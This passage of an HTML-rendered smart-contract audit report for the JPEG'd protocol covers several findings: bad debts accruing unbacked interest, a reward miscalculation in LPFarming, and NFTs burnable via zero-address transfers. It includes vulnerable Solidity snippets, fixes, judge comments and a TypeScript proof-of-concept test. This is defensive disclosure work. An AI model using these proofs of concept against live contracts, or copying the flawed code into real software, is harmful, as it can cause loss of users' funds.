1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>vim, ganache-cli</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Pass <code>address(this)</code> as argument of <code>earned</code>.</p>\n<p>Notice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function balanceOfJPEG() external view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 availableBalance = jpeg.balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        availableBalance += baseRewardPool.earned(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 length = baseRewardPool.extraRewardsLength();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            if (address(jpeg) == extraReward.rewardToken()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                availableBalance += extraReward.earned(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return availableBalance;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/139\">spaghettieth (JPEG’d) confirmed, but disagreed with High severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1099248200\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/15\">jpegd/core#15</a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1109915863\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Leaving this as high risk. The issue would cause a loss of funds.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-09-bad-debts-should-not-continue-to-accrue-interest\" style=\"position:relative;\"><a href=\"#h-09-bad-debts-should-not-continue-to-accrue-interest\" aria-label=\"h 09 bad debts should not continue to accrue interest permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/167\">[H-09] Bad debts should not continue to accrue interest</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L844-L851\">NFTVault.sol#L844-L851</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getDebtAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk11\">_getLiquidationLimit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nftIndex</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;position_not_liquidatable&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// burn all payment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">stablecoin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">debtAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the current design/implementation, the liquidator must fully repay the user’s outstanding debt in order to get the NFT.</p>\n<p>When the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.</p>\n<p>In that case, the protocol will have positions that are considered bad debts.</p>\n<p>However, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new <code>stablecoin</code> will be minted.</p>\n<p>When the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Given:</p>\n<ul>\n<li><code>NFT 1</code> worth 30,000 USD</li>\n<li><code>creditLimitRate</code> = 60%</li>\n<li><code>liquidationLimitRate</code> = 50%</li>\n<li><code>debtInterestApr</code> = 10%</li>\n<li>Alice borrowed <code>10,000 USD</code> with <code>NFT #1</code>;</li>\n<li>After 1 year, <code>NFT 1</code>’s market value in USD has suddenly dropped to <code>10,000</code> USD, no liquidator is willing to repay 11,000 USD for <code>NFT #1</code>;</li>\n<li>The DAO <code>collect()</code> and minted <code>1,000</code> stablecoin;</li>\n<li>After 1 year, the DAO call <code>collect()</code> will mint <code>1,100</code> stablecoin. and so on…</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change <code>accrue</code> to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">badDebtPortion</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">accrue</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">additionalInterest</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_calculateAdditionalInterest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalDebtAccruedAt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalDebtAmount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">additionalInterest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectibleInterest</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">additionalInterest</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">badDebtPortion</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalFeeCollected</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">collectibleInterest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/167\">spaghettieth (JPEG’d) acknowledged, but disagreed with High severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/167#issuecomment-1109933407\">LSDan (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the warden. Left unchecked, this issue is almost certain to occur and will cause substantial negative impacts on the protocol. The only way this would not occur is if the NFT market never crashes.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-11\" style=\"position:relative;\"><a href=\"#medium-risk-findings-11\" aria-label=\"medium risk findings 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (11)</h1>\n<h2 id=\"m-01-when-_lptoken-is-jpeg-reward-calculation-is-incorrect\" style=\"position:relative;\"><a href=\"#m-01-when-_lptoken-is-jpeg-reward-calculation-is-incorrect\" aria-label=\"m 01 when _lptoken is jpeg reward calculation is incorrect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/1\">[M-01] When _lpToken is jpeg, reward calculation is incorrect</a></h2>\n<p><em>Submitted by cccz, also found by minhquanym</em></p>\n<p>In the LPFarming contract, a new staking pool can be added using the add() function. The staking token for the new pool is defined using the _lpToken variable. However, there is no additional checking whether the _lpToken is the same as the reward token (jpeg) or not.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _massUpdatePools();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lastRewardBlock = _blockNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        totalAllocPoint = totalAllocPoint + _allocPoint;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        poolInfo.push(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            PoolInfo({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                lpToken: _lpToken,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                allocPoint: _allocPoint,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                lastRewardBlock: lastRewardBlock,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                accRewardPerShare: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            })</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>When the _lpToken is the same token as jpeg, reward calculation for that pool in the updatePool() function can be incorrect. This is because the current balance of the _lpToken in the contract is used in the calculation of the reward. Since the _lpToken is the same token as the reward, the reward minted to the contract will inflate the value of lpSupply, causing the reward of that pool to be less than what it should be.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _updatePool(uint256 _pid) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        PoolInfo storage pool = poolInfo[_pid];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (pool.allocPoint == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 blockNumber = _blockNumber();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //normalizing the pool&#39;s `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (blockNumber &lt;= lastRewardBlock) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lpSupply = pool.lpToken.balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (lpSupply == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            pool.lastRewardBlock = blockNumber;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 reward = ((blockNumber - lastRewardBlock) *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            epoch.rewardPerBlock *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            1e36 *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            pool.allocPoint) / totalAllocPoint;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        pool.lastRewardBlock = blockNumber;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L141-L154\">LPFarming.sol#L141-L154</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/LPFarming.sol#L288-L311\">LPFarming.sol#L288-L311</a><br></p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a check that _lpToken is not jpeg in the add function or mint the reward token to another contract to prevent the amount of the staked token from being mixed up with the reward token.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/1\">spaghettieth (JPEG’d) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/1#issuecomment-1099231224\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in <a href=\"https://github.com/jpegd/core/pull/2\">jpegd/core#2</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-nfthelper-contract-allows-owner-to-burn-nfts\" style=\"position:relative;\"><a href=\"#m-02-nfthelper-contract-allows-owner-to-burn-nfts\" aria-label=\"m 02 nfthelper contract allows owner to burn nfts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/47\">[M-02] NFTHelper Contract Allows Owner to Burn NFTs</a></h2>\n<p><em>Submitted by Kenshin</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L38\">CryptoPunksHelper.sol#L38</a><br>\n<a href=\"https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/helpers/CryptoPunksHelper.sol#L52\">CryptoPunksHelper.sol#L52</a><br></p>\n<p>In the NFT helper contract, there is no validation on that the receiver address must not be address zero. Therefore, it allows owner or an attacker who gain access to the owner address to burn NFTs forever through the functions by transferring the NFTs to address zero.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The PoC is originally conducted using foundry. However, it isn’t that complicated so I rewrote it in TypeScipt as well, the team can easily proof this by including in the <code>CryptoPunksHelper.ts</code>.</p>\n<h4 id=\"typescript\" style=\"position:relative;\"><a href=\"#typescript\" aria-label=\"typescript permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TypeScript</h4>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// add `.only` to run only this test, not all.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">it.only(&quot;allows the owner to burn nfts&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // safeTransferFrom</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await cryptoPunks.getPunk(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await cryptoPunks.transferPunk(helper.address, 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await helper.safeTransferFrom(owner.address, ZERO_ADDRESS, 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(await cryptoPunks.punkIndexToAddress(1)).to.equal(ZERO_ADDRESS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(await helper.ownerOf(1)).to.equal(ZERO_ADDRESS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // transferFrom</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await cryptoPunks.getPunk(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await cryptoPunks.transferPunk(helper.address, 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await helper.transferFrom(owner.address, ZERO_ADDRESS, 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(await cryptoPunks.punkIndexToAddress(2)).to.equal(ZERO_ADDRESS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    expect(await helper.ownerOf(2)).to.equal(ZERO_ADDRESS);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span></code></pre>\n<h4 id=\"foundry\" style=\"position:relative;\"><a href=\"#foundry\" aria-label=\"foundry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Foundry</h4>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// for test</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;ds-test/test.sol&quot;;</span></span>\n<span 